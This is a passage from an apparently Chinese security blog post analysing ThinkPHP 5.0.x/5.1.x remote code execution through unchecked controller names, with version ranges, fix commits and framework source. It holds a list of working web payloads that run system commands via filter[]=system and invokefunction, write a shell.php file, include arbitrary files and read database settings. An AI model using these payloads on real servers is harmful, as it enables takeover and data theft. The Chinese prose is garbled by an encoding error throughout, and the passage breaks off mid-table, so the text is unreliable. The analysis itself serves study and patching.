ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨å…¥æ¢è¡Œç¬¦ç»•è¿‡è¯¥é™åˆ¶ã€‚ï¼‰ å†™å…¥<code>$filename</code>ä»è€ŒGetShellã€‚</p><blockquote><p>æœ€åå¦‚æœç¨‹åºæœ‰è®¾ç½® <strong>$this-&gt;options[â€˜prefixâ€™]</strong> çš„è¯(ä¹Ÿå°±æ˜¯ä¸Šä¸Šå›¾ä¸­çš„è®¾ç½®æ–‡ä»¶åå‰ç¼€çš„ä»£ç )ï¼Œåœ¨æ²¡æœ‰æºç çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ— æ³•è·å¾— <strong>webshell</strong> çš„å‡†ç¡®è·¯å¾„ã€‚</p></blockquote><h2 id="åˆ©ç”¨æ€»ç»“"><a href="#åˆ©ç”¨æ€»ç»“" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923173430.png"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>1ï¼Œthinkphp3.2çš„ç‰ˆæœ¬è¯·é€‰æ‹©å¼€å¯ï¼šDATA_CACHE_KEY è¿™æ ·å°±ç®—ä½ ä½¿ç”¨çš„cmsæ˜¯å¼€æºçš„äººå®¶å‘ç°äº†è¿™ä¸ªä¹Ÿæ— æ³•ä½¿ç”¨ã€‚<br>2ï¼Œtp3.2-tp5  åšå¥½ç›®å½•æƒé™ï¼Œé™¤å…¬å…±ç›®å½•ç»å¯¹ä¸è¦è®©å¤–éƒ¨å¯è®¿é—®</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><h1 id="RCE2-åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE"><a href="#RCE2-åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE" class="headerlink" title="RCE2(åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE)"></a>RCE2(åˆ©ç”¨ä»»æ„æ§åˆ¶å™¨è°ƒç”¨RCE)</h1><blockquote><p>æ§åˆ¶å™¨è¿‡æ»¤ä¸ä¸¥ï¼Œç»“åˆç›´æ¥è¿”å›ç±»åçš„ä»£ç æ“ä½œï¼Œå¯¼è‡´å¯ä»¥ç”¨å‘½åç©ºé—´çš„æ–¹å¼æ¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•</p></blockquote><p>è·å–å¤ç°ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1.0 tpdemo</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹composer.json çš„  require å­—æ®µã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.30&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>composer update</p><p>ç›¸å…³å‚è€ƒèµ„æ–™ï¼š</p><p><strong>æ„Ÿè§‰è‡ªå·±åˆ†æçš„ä¸å¥½ï¼Œè¦å­¦ä¹ è¿˜æ˜¯å»çœ‹å‚è€ƒèµ„æ–™å§ã€‚</strong></p><p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p><p><a href="https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/">https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/</a></p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><p><strong>5.1.x</strong> ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p><strong>5.0.x</strong> ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # è·å–é…ç½®ä¿¡æ¯</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # åŒ…å«ä»»æ„æ–‡ä»¶</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # åŒ…å«ä»»æ„.phpæ–‡ä»¶</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä»¥ä»¥è¿™ä¸ªPOCè¿›è¡Œåˆ†æï¼ŒThinkPHP ç‰ˆæœ¬ä¸º<code>5.1.30</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure><p>![image-20200923201833962](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923201833962.png)</p><h2 id="æ¼æ´æ¦‚è¿°-1"><a href="#æ¼æ´æ¦‚è¿°-1" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><blockquote><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> åº•å±‚æ²¡æœ‰å¯¹æ§åˆ¶å™¨åè¿›è¡Œå¾ˆå¥½çš„åˆæ³•æ€§æ ¡éªŒï¼Œå¯¼è‡´åœ¨æœªå¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</strong> çš„äº§ç”Ÿã€‚</p></blockquote><h2 id="å½±å“ç‰ˆæœ¬-1"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.7&lt;=ThinkPHP5&lt;=5.0.22</strong> ã€<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><p>ä¸åŒç‰ˆæœ¬çš„Payloadï¼Œéœ€è¦åšç›¸å…³çš„è°ƒæ•´ã€‚</p><h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨5.1.31çš„æ›´æ–°ä¸­ï¼ŒæŸ¥çœ‹ç›¸å…³æ›´æ–°çš„ä¿¡æ¯ï¼Œå…¶ä¸­å…³äº<code>ä¿®æ­£æ§åˆ¶å™¨åè·å–</code> çš„commit</p><p>![image-20200923221710652](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923221710652.png)</p><p>å¦å¤–ï¼Œå®˜æ–¹å¯¹äºæ­¤å¤„æ›´æ–°ï¼Œä¸“é—¨å‘äº†ä¸€æ¬¡å¾®ä¿¡å…¬å‘Šã€‚<a href="https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A">https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A</a></p><p>å†…å®¹å¦‚ä¸‹ï¼š</p><blockquote><p>æœ¬æ¬¡ç‰ˆæœ¬æ›´æ–°ä¸»è¦æ¶‰åŠä¸€ä¸ªå®‰å…¨æ›´æ–°ï¼Œç”±äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ä¼šå¯¼è‡´åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½çš„<code>getshell</code>æ¼æ´ï¼Œå—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬<code>5.0</code>å’Œ<code>5.1</code>ç‰ˆæœ¬ï¼Œæ¨èå°½å¿«æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚å¦‚æœæš‚æ—¶æ— æ³•æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ï¼Œè¯·å¼€å¯å¼ºåˆ¶è·¯ç”±ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150733.png" alt="image-20200923225433768"></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒThinkPHP ä¸å¼€å¯å¼ºåˆ¶è·¯ç”±ï¼Œå¹¶ä¸”å¼€å¯äº†è·¯ç”±å™¨å…¼å®¹æ¨¡å¼ï¼Œ<code>s</code>ã€‚</p><p>5.1.31 ä¿®å¤åœ°å€ï¼š<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><p>ä¸¤ä¸ªå…³é”®ç‚¹ï¼š</p><ul><li>æ§åˆ¶å™¨å</li><li>å¼ºåˆ¶è·¯ç”±</li></ul><p>by ä¸ƒæœˆç«å¸ˆå‚…ï¼š</p><blockquote><p>åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±ï¼Œè¯´æ˜æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è·¯ç”±å…¼å®¹æ¨¡å¼ <strong>s</strong> å‚æ•°ï¼Œè€Œæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ï¼Œè¯´æ˜å¯èƒ½å¯ä»¥è°ƒç”¨ä»»æ„çš„æ§åˆ¶å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¯•ç€åˆ©ç”¨ <code>http://site/?s=æ¨¡å—/æ§åˆ¶å™¨/æ–¹æ³•</code> æ¥æµ‹è¯•ä¸€ä¸‹ã€‚åœ¨å…ˆå‰çš„ <strong>ThinkPHP SQLæ³¨å…¥</strong> åˆ†ææ–‡ç« ä¸­ï¼Œæˆ‘ä»¬éƒ½æœ‰æåˆ°æ‰€æœ‰ç”¨æˆ·å‚æ•°éƒ½ä¼šç»è¿‡ <strong>Request</strong> ç±»çš„ <strong>input</strong> æ–¹æ³•å¤„ç†ï¼Œè¯¥æ–¹æ³•ä¼šè°ƒç”¨ <strong>filterValue</strong> æ–¹æ³•ï¼Œè€Œ <strong>filterValue</strong> æ–¹æ³•ä¸­ä½¿ç”¨äº† <strong>call_user_func</strong> ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ¥å°è¯•åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ã€‚</p></blockquote><p><a href="https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select">https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p><code>call_user_func($filter,$value);</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150312.png" alt="image-20200923230344961"></p><p>å¯ä»¥çœ‹åˆ°ç³»ç»Ÿå‘½ä»¤æˆåŠŸæ‰§è¡Œã€‚</p><p>æ ¹æ®ä¿®å¤çš„å†…å®¹ï¼šå¯¹æ§åˆ¶å™¨åçš„è·å–ï¼Œç›´æ¥åœ¨è·å–æ§åˆ¶å™¨çš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼Œæ¥è¿›è¡Œè°ƒè¯•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150235.png" alt="image-20200923231658510"></p><p>å¾—å‡ºï¼šæ§åˆ¶å™¨åæ˜¯é€šè¿‡<code>$result[1]</code> æ¥è·å–çš„ã€‚</p><blockquote><p>è€Œ <strong>$result</strong> çš„å€¼æ¥æºäºå…¼å®¹æ¨¡å¼ä¸‹çš„ <strong>pathinfo</strong> ï¼Œå³ <strong>s</strong> å‚æ•°</p></blockquote><p>ç»§ç»­è¿›è¡Œå•æ­¥è°ƒè¯•ï¼Œç¨‹åºä¼šæ¥åˆ°Appç±»ä¸‹çš„<code>run</code>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150152.png" alt="image-20200924094001917"></p><p>ç»§ç»­è°ƒç”¨<code>Dispatch</code>ç±»çš„<code>run</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è°ƒç”¨äº†<code>exec</code> æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $option = <span class="keyword">$this</span>-&gt;rule-&gt;getOption();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ£€æµ‹è·¯ç”±afterè¡Œä¸º</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($option[<span class="string">&#x27;after&#x27;</span>])) &#123;</span><br><span class="line">        $dispatch = <span class="keyword">$this</span>-&gt;checkAfter($option[<span class="string">&#x27;after&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($dispatch <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">            <span class="keyword">return</span> $dispatch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ•°æ®è‡ªåŠ¨éªŒè¯</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($option[<span class="string">&#x27;validate&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;autoValidate($option[<span class="string">&#x27;validate&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;exec();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ç›‘å¬module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;module_init&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ–æ§åˆ¶å™¨</span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($instance <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">            $instance-&gt;registerMiddleware();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> (<span class="params">Request $request, $next</span>) <span class="title">use</span> (<span class="params">$instance</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// è·å–å½“å‰æ“ä½œå</span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// æ‰§è¡Œæ“ä½œæ–¹æ³•</span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ä¸¥æ ¼è·å–å½“å‰æ“ä½œæ–¹æ³•å</span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡</span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_param_type&#x27;</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">            $vars = array_merge($vars, <span class="keyword">$this</span>-&gt;param);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">&#x27;_empty&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// ç©ºæ“ä½œ</span></span><br><span class="line">            $call    = [$instance, <span class="string">&#x27;_empty&#x27;</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">&#x27;_empty&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// æ“ä½œä¸å­˜åœ¨</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;method not exists:&#x27;</span> . get_class($instance) . <span class="string">&#x27;-&gt;&#x27;</span> . $action . <span class="string">&#x27;()&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;action_begin&#x27;</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">&#x27;controller&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨äº†åå°„æœºåˆ¶ï¼Œè°ƒç”¨ç±»çš„æ–¹æ³•ï¼Œè¿™é‡Œç±»å’Œæ–¹æ³•éƒ½å¯æ§ã€‚</p><p>è¯¥æ–¹æ³•ä¸­ï¼Œ<strong>æœªå¯¹å®ä¾‹åŒ–æ§åˆ¶å™¨å’Œæ“ä½œåè¿›è¡Œä»»ä½•è¿‡æ»¤ã€åˆæ³•æ€§æ£€æµ‹æ“ä½œï¼Œè¿™å°±æ˜¯å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œçš„ç›´æ¥åŸå› ã€‚</strong></p><hr><p>å¦‚æœç›´æ¥æ‹¿è¯¥ç‰ˆæœ¬çš„ <strong>payload</strong> å»æµ‹è¯• <strong>ThinkPHP5.0.x</strong> ç‰ˆæœ¬ï¼Œä¼šå‘ç°å¾ˆå¤š <strong>payload</strong> éƒ½ä¸èƒ½æˆåŠŸã€‚å…¶åŸå› æ˜¯ä¸¤ä¸ªå¤§ç‰ˆæœ¬å·²åŠ è½½çš„ç±»ä¸åŒï¼Œå¯¼è‡´å¯åˆ©ç”¨çš„ç±»ä¹Ÿä¸å°½ç›¸åŒã€‚å…·ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP 5.1.x                  ThinkPHP 5.0.x</span><br><span class="line">stdClass                        stdClass </span><br><span class="line">Exception                       Exception </span><br><span class="line">ErrorException                  ErrorException </span><br><span class="line">Closure                         Closure </span><br><span class="line">Generator                       Generator </span><br><span class="line">DateTime                        DateTime </span><br><span 